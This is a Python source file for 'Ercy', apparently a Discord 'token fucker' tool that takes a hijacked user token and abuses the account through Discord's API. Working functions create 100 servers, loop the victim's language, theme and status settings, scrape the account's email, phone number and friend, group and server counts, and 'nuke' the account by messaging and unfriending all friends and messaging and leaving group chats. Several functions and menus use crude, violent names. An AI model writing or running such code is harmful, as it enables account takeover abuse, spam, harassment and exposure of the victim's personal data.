import time
import os





try:
    import colorama
except Exception as f:
    dyw2 = input("You don't have colorama installed. Do you wan't to install it? (Y/N) : ")
    if dyw2.lower() == "y":
        os.system("pip3 install colorama")
        
    elif dyw2.lower() == "n":
        print("Application cannot run without this module.")
        input()

    else:
        print("Invalid answer.")
        input()
        

try:
    import discord
except Exception as f:
    dyw1 = input("You don't have discord.py installed. Do you wan't to install it? (Y/N) : ")
    if dyw1.lower() == "y":
        os.system("pip3 install discord")
        
    elif dyw1.lower() == "n":
        print("Application cannot run without this module.")
        input()

    else:
        print("Invalid answer.")
        input()

try:
    import requests
except Exception as f:
    dyw1 = input("You don't have requests installed. Do you wan't to install it? (Y/N) : ")
    if dyw1.lower() == "y":
        os.system("pip3 install requests")
        
    elif dyw1.lower() == "n":
        print("Application cannot run without this module.")
        input()

    else:
        print("Invalid answer.")
        input()


from discord.ext import commands
from discord.ext import tasks
bot = commands.Bot(command_prefix="!", self_bot=True)
bot.remove_command("help")


from colorama import Fore, init

kali = input("Are you using Kali (Y/N) : ")
if kali.lower() == "n":
    init(convert=True)


def clr():
    if kali.lower() == "n":
        os.system("cls")
    elif kali.lower() == "y":
        os.system("clear") 




R = '\033[31m' # red
BR = '\u001b[31;1m' # bright red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
B = '\u001b[34;1m' # blue
P = '\033[35m' # purple


    


def banner():
    print(f'''{R}


                                        ◸                                   ◹
                                           {R}███████╗██████╗  ██████╗██╗   ██╗ 
                                           ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝ 
                                           █████╗  ██████╔╝██║      ╚████╔╝  
                                           ██╔══╝  ██╔══██╗██║       ╚██╔╝   
                                           ███████╗██║  ██║╚██████╗   ██║    
                                           ╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    
                                        {W}◺                                   ◿ 
                                 


''')


def acctoolbanner():
    print(f'''

{R}
         █████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗    
        ██╔══██╗██╔════╝██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝    
        ███████║██║     ██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     ███████╗    
        ██╔══██║██║     ██║     ██║   ██║██║   ██║██║╚██╗██║   ██║          ██║   ██║   ██║██║   ██║██║     ╚════██║    
        ██║  ██║╚██████╗╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗███████║    
        ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    
         {W}                                                                                                               


''')



def tfuckhelp():
    clr()
    print(f'''

{R}
        ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     
        ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
           ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    
           ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    
           ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║   
           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    
                                                                                                         
{W}┌────────── {R}Ercy Token Fuck Commands
{W}├──🞂 {P}ercy-tf-spamservers / ss
{W}├──🞂 {P}ercy-tf-looplang / ll
{W}├──🞂 {P}ercy-tf-darkandlight / dnl
{W}├──🞂 {P}ercy-tf-statusrape / sr
{W}├──🞂 {P}ercy-tf-nuketoken / nt
{W}├──🞂 {P}ercy-tf-scrapetoken / st
{W}├──🞂 {P}ercy-tf-lockacc / la
{W}├──🞂 {P}ercy-tf-tokenlocation / tl
{W}├──🞂 {P}ercy-tf-help / h
{W}├──🞂 {P}ercy-tf-changename / cn (password needed)
{W}└──🞂 {P}ercy-tf-return / r
    
    ''')
    token_fucker(False)
    




def tokenfuckbanner():
    print(f'''

{R}
        ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    
        ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║   
           ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    
           ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║   
           ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║   
           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   
                                                                                                         
{W}
    
    ''')






def Help():
    print(f'''{W}
                                        ◸                                   ◹
                                           {R}███████╗██████╗  ██████╗██╗   ██╗ 
                                           ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝ 
                                           █████╗  ██████╔╝██║      ╚████╔╝  
                                           ██╔══╝  ██╔══██╗██║       ╚██╔╝   
                                           ███████╗██║  ██║╚██████╗   ██║    
                                           ╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    
                                        {W}◺                                   ◿
{W}┌────────── {R}Ercy Commands
{W}├──🞂 {P}ercy-account_tools/at
{W}├──🞂 {P}ercy-token_fucker/tf
{W}├──🞂 {P}ercy-ip_pinger/ip
{W}├──🞂 {P}ercy-token_settings/ts
{W}├──🞂 {P}ercy-selfbot/sb
{W}├──🞂 {P}ercy-info/i
{W}├──🞂 {P}ercy-help/h
{W}├──🞂 {P}ercy-credits/c   
{W}├──🞂 {P}ercy-server/s
{W}├──🞂 {P}ercy-get_token/gt
{W}└──🞂 {P}ercy-return/r                               





    ''')
    StartUp(False)


def atthelp():
    clr()
    print(f'''{W}
                                        ◸                                   ◹
                                           {R}███████╗██████╗  ██████╗██╗   ██╗ 
                                           ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝ 
                                           █████╗  ██████╔╝██║      ╚████╔╝  
                                           ██╔══╝  ██╔══██╗██║       ╚██╔╝   
                                           ███████╗██║  ██║╚██████╗   ██║    
                                           ╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    
                                        {W}◺                                   ◿
{W}┌────────── {R}Ercy Account Commands
{W}├──🞂 {P}ercy-at-massdmfriends / mdf
{W}├──🞂 {P}ercy-at-massgcl / mgl
{W}├──🞂 {P}ercy-at-serverleave / sl
{W}├──🞂 {P}ercy-at-massunf / mu
{W}├──🞂 {P}ercy-at-massblock / mb
{W}├──🞂 {P}ercy-at-setstatus/ ss
{W}├──🞂 {P}ercy-at-delownservers / dos
{W}├──🞂 {P}ercy-at-closedms / cd
{W}├──🞂 {P}ercy-at-massdmgcs / mdc
{W}├──🞂 {P}ercy-at-massdmall / mda
{W}├──🞂 {P}ercy-at-help / h
{W}└──🞂 {P}ercy-at-return / r
                            





    ''')
    accounttools(False)
    
        





clr()
banner()


if kali.lower() == "y":
    user = input(f"{G}[{R}ercy💀/{G}]{B}${W} Insert Temp User: ")
elif kali.lower() == "n":
    user = input(f"{G}[{R}ercy#/{G}]{B}${W} Insert Temp User: ")

def serverspam():
    token = input(f"{W}[{G}>{W}] Token: ")
    servername = input(f"{W}[{G}>{W}] Server Name: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    guild = {
    'name': f"{servername}"
    } 
    for i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        print(f"{Fore.GREEN}[+] {Fore.RED} Created Server Named {Fore.WHITE}{servername}")

    bot.run(token, bot = False)


def langrape():
    token = input(f"{W}[{G}>{W}] Token: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    payload1 = {
          'locale': "ro"
      }
    payload2 = {
          'locale': "ja"
      }
    payload3 = {
          'locale': "fr"
      }
    for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        print(f"{Fore.GREEN}[+] {Fore.RED} Raping Language")
    bot.run(token, bot = False)
    

def dnl():
    token = input(f"{W}[{G}>{W}] Token: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    payload = {
      'theme': "dark"
      }
    payload2 = {
      'theme': "light"
      }
    for i in range(1000):
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      print(f"{Fore.GREEN}[+] {Fore.RED} Dark and Light Targeting: {token}")

    bot.run(token, bot = False)


def massdm(msg, token):
    @bot.event
    async def on_connect():
        for user in bot.user.friends:
            try:
                await user.send(msg)
                await user.remove_friend()
            except:
                print("Unavailable.")

    bot.run(token, bot = False)

def gcl(msg,token):
    @bot.event
    async def on_ready():
        for channel in bot.private_channels:
            if isinstance(channel, discord.GroupChannel):
                if channel.id == "888858612603191396":
                    print("Can't leave that.")
                else:
                    await channel.send(msg)
                    await channel.leave()




def nti(token):
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n[{Fore.RED}User ID{Fore.RESET}]         {userID}\n            [{Fore.RED}User Name{Fore.RESET}]       {userName}\n            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}\n            [{Fore.RED}Email{Fore.RESET}]           {email}\n            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ''}\n            [{Fore.RED}Token{Fore.RESET}]           {token}\n            ")
        input()
        bot.run(token, bot = False)

    



def tokenInfo():
    token = input(f"{W}[{G}>{W}] Token: ")
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n[{Fore.RED}User ID{Fore.RESET}]         {userID}\n            [{Fore.RED}User Name{Fore.RESET}]       {userName}\n            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}\n            [{Fore.RED}Email{Fore.RESET}]           {email}\n            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ''}\n            [{Fore.RED}Token{Fore.RESET}]           {token}\n            ")
        input()
        bot.run(token, bot = False)


def statusrape():
    token = input(f"{W}[{G}>{W}] Token: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    payload = {
          'status': "dnd"
      }
    payload2 = {
          'status': "idle"
      }
    payload3 = {
          'status': "invisible"
      } 
    payload4 = {
          'status': "online"
      }
    for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        time.sleep(1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        time.sleep(1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        time.sleep(1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload4)
        time.sleep(1)

def scrapetoken():
    token = input(f"{W}[{G}>{W}] Token: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    print(f"[{P}-{W}] Scraping Token (Can Take A While)")
    email = r.json()['email']
    phone = r.json()['phone']
    userID = r.json()['id']
    time.sleep(2)
    @bot.event
    async def on_connect():
        friendc = 0
        gcc = 0
        serverc = 0

        for user in bot.user.friends:
            friendc = friendc + 1
            time.sleep(0.05)
        print(f"[{G}+{W}] Friend List Scraped")

        for channel in bot.private_channels:
            if isinstance(channel, discord.GroupChannel):
                gcc = gcc + 1
                time.sleep(0.05)
        print(f"[{G}+{W}] Group List Scraped")
        for guild in bot.guilds:
            serverc = serverc + 1
            time.sleep(0.05)
            
        print(f"[{G}+{W}] Server List Scraped")
        time.sleep(0.5)
        print(f'''
[{G}+{W}] Friend Count: {friendc}
[{G}+{W}] Groupchat Count: {gcc}
[{G}+{W}] Server Count: {serverc}
[{G}+{W}] Email: {email}
[{G}+{W}] Phone: {phone}
[{G}+{W}] UserID = {userID}

    ''')

    bot.run(token, bot = False)


def nuke():
    token = input(f"{W}[{G}>{W}] Token: ")
    message = input(f"{W}[{G}>{W}] Message: ")
    massdm(message, token)
    gcl(message, token)
    
    
    


    

    
        
    









def token_fucker(clear):
    if clear == True:
        clr()
        tokenfuckbanner()
    
    print("Use ercy-tf-h for the list of token fucker commands.")
    if kali.lower() == "y":
        opt = input(f"{G}[{R}ercy💀/{C}{user}{R}/{C}token_fucker{G}]{B}${W} ")
    elif kali.lower() == "n":
        opt = input(f"{G}[{R}ercy#/{C}{user}{R}/{C}token_fucker{G}]{B}${W} ")
    


    if opt.lower() == "ercy-tf-h" or opt.lower() == "ercy-tf-help":
        tfuckhelp()
    elif opt.lower() == "ercy-tf-spamservers" or opt.lower() == "ercy-tf-ss":
        serverspam()
    elif opt.lower() == "ercy-tf-looplang" or opt.lower() == "ercy-tf-ll":
        langrape()
    elif opt.lower() == "ercy-tf-darkandlight" or opt.lower() == "ercy-tf-dnl":
        dnl()
    elif opt.lower() == "ercy-tf-statusrape" or opt.lower() == "ercy-tf-sr":
        statusrape()
    elif opt.lower() == "ercy-tf-nuketoken" or opt.lower() == "ercy-tf-nt":
        nuke() 
    elif opt.lower() == "ercy-tf-scrapetoken" or opt.lower() == "ercy-tf-st":
        scrapetoken()
    elif opt.lower() == "ercy-tf-lockacc" or opt.lower() == "ercy-tf-la":
        print("TBC")
        time.sleep(1)
        StartUp(True)
    elif opt.lower() == "ercy-tf-tokenlocation" or opt.lower() == "ercy-tf-tl":
        tokenInfo()
    elif opt.lower() == "ercy-tf-changename" or opt.lower() == "ercy-tf-cn":
        print("TBC")
        time.sleep(1)
        StartUp(True)
    elif opt.lower() == "ercy-tf-return" or opt.lower() == "ercy-tf-r":
        StartUp(True)
    else:
        print(f"Command '{opt}' can not be found.")
        time.sleep(2)
        token_fucker(True)



def mdf():
    token = input(f"{W}[{G}>{W}] Token: ")
    msg = input(f"{W}[{G}>{W}] Message: ")
    massdm(msg, token)
    




def StartUp(clear):
    if clear == True:
        clr()
    print("use : ercy-help / ercy-h (to see commands)")
    if kali.lower() == "y":
        opt = input(f"{G}[{R}ercy💀/{C}{user}{G}]{B}${W} ")
    elif kali.lower() == "n":
        opt = input(f"{G}[{R}ercy#/{C}{user}{G}]{B}${W} ")

    
    
    
    clr()

    if opt == "ercy-help" or opt == "ercy-h":
        Help()
    elif opt == "ercy-token_fucker" or opt == "ercy-tf":
        token_fucker(True)
    elif opt == "ercy-ip_pinger" or opt == "ercy-ip":
        print("Ercy Pinger")
    elif opt == "ercy-token_settings" or opt == "ercy-ts":
        print("Ercy Token Settings")
    elif opt == "ercy-selbot" or opt == "ercy-sb":
        print("Ercy Selfbot")
    elif opt == "ercy-info" or opt == "ercy-i":
        print("Ercy Info")
    elif opt == "ercy-credits" or opt == "ercy-c":
        print("Ercy Credits")
    elif opt == "ercy-server" or opt == "ercy-s":
        print("Ercy Discord Server")
    elif opt == "ercy-get_token" or opt == "ercy-gt":
        print("Get User Token")
    elif opt == "ercy-account_tools" or opt == "ercy-at":
        accounttools(True)
    elif opt == "ercy-return" or opt == "ercy-r":
        print(opt)
        StartUp(True)
    else:
        print(f"Command '{opt}' can not be found.")
        time.sleep(2)
        StartUp(True)



def accounttools(clear):
    if clear == True:
        clr()
        acctoolbanner()
    
    print("Use ercy-at-h for the list of account tool commands.")
    if kali.lower() == "y":
        opt = input(f"{G}[{R}ercy💀/{C}{user}{R}/{C}account_tools{G}]{B}${W} ")
    elif kali.lower() == "n":
        opt = input(f"{G}[{R}ercy#/{C}{user}{R}/{C}account_tools{G}]{B}${W} ")
    


    if opt.lower() == "ercy-at-h" or opt.lower() == "ercy-at-help":
        atthelp()
    elif opt.lower() == "ercy-at-massgcl" or opt.lower() == "ercy-at-mgl":
        print("Mass GCL")
    elif opt.lower() == "ercy-at-massdmfriends" or opt.lower() == "ercy-at-mdf":
        mdf()
    elif opt.lower() == "ercy-at-serverleave" or opt.lower() == "ercy-at-sl":
        print("Server Leave")
    elif opt.lower() == "ercy-at-massunf" or opt.lower() == "ercy-at-mu":
        print("Mass Unfriend")
    elif opt.lower() == "ercy-at-massblock" or opt.lower() == "ercy-at-mb":
        print("Mass Block")
    elif opt.lower() == "ercy-at-setstatus" or opt.lower() == "ercy-at-ss":
        print("Set Status")
    elif opt.lower() == "ercy-at-delownservers" or opt.lower() == "ercy-at-dos":
        print("Deleting servers")
    elif opt.lower() == "ercy-at-closedms" or opt.lower() == "ercy-at-cd":
        print("Close Dms")
    elif opt.lower() == "ercy-at-massdmgcs" or opt.lower() == "ercy-at-mdc":
        print("Mass Dm GroupChats")
    elif opt.lower() == "ercy-at-massdmall" or opt.lower() == "ercy-at-mda":
        print("Mass Dm Everything")
    elif opt.lower() == "ercy-at-return" or opt.lower() == "ercy-at-r":
        StartUp(True)
    else:
        print(f"Command '{opt}' can not be found.")
        time.sleep(2)
        accounttools(True)
        


    
    
    




StartUp(True)






